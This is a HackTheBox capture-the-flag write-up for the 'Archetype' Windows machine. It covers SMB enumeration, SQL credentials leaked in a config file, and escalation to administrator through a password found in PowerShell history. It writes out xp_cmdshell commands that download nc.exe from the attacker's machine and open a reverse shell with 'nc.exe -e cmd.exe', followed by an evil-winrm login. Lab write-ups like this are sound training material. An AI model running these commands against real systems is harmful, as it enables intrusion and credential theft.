# HACKTHEBOX - Archetype

**nmap scan**: sudo nmap -v -sV -sC -oN nmap.txt $IP
```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
........
|_SHA-1: 54e6 8e48 de5f 3fa3 c183 0641 b4d0 9080 8c15 78a2
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
......
```

Ok, let's connect to SMB on port 445:

```bash
smbclient -L $IP
# backups         Disk

# Connect to SMB share
smbclient \\\\$IP\\backups
```

**file found**: `prod.dtsConfig`
```xml
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 
```
**Credentials found**: `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`, this credential is from sql server, try using this to connect to MSSQL Server with impacket.

```bash
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket && cd /opt/impacket
sudo docker build . -t impacket
sudo docker run -it impacket #? /bin/bash
# .....

# Using mssqlclient from impacket to connect to Microsoft SQL Server
mssqlclient -p 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.129.185.63 -windows-auth
```

**Procedures to get Reverse Shell**:
```bash
help # what procedures do you have?
enable_xp_cmdshell # xp_cmdshell for RCE
xp_cmdshell powershell curl [kali-tun0]/nc.exe -o C:\\Users\Public\nc.exe
xp_cmdshell powershell C:\\Users\Public\nc.exe -e cmd.exe [kali-tun0] 8888 # reverse-shell here!!
```

Using winPEAS to enumerate machine in order to find way to priviledge escalation
**file contain admin password found**:
```bash
powershell ./winPEAS.exe
# found: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**credential found**: `\\Archetype\backups /user:administrator MEGACORP_4dm1n!!`

Ok, first thing first, find user flag:
```bash
where -r c:\\ *.txt 
# found: c:\Users\sql_svc\Desktop\user.txt
type c:\Users\sql_svc\Desktop\user.txt
```

**user flag**: `HTB{3e7b102e78218e935bf3f4951feXXXXX}`

Because we don't have(don't know how to get) interactive shell so we can't supply password for `runas`(cannot one line either) cmd command!!, windows don't directly have a way to switch to another account in shell.

**Remote??**: What to do?? test windows remote port
```bash
nmap -p 3389 -v 10.129.185.63
# PORT     STATE  SERVICE
# 3389/tcp closed ms-wbt-server

nmap -v -p 5985,5986 10.129.185.63
# PORT     STATE  SERVICE
# 5986/tcp closed wsmans
# 5985/tcp open  wsman
```
yes, yes, yes, WinRM, remote management in CLI(GUI RDP port 3389)!!
```bash
evil-winrm -i 10.129.185.63 -p 5985 -u administrator -p MEGACORP_4dm1n!!
# success!!
type C:\\Users\Administrator\Desktop\root.txt
```

**root flag**: `HTB{b91ccec3305e98240082d4474b8XXXXX}`
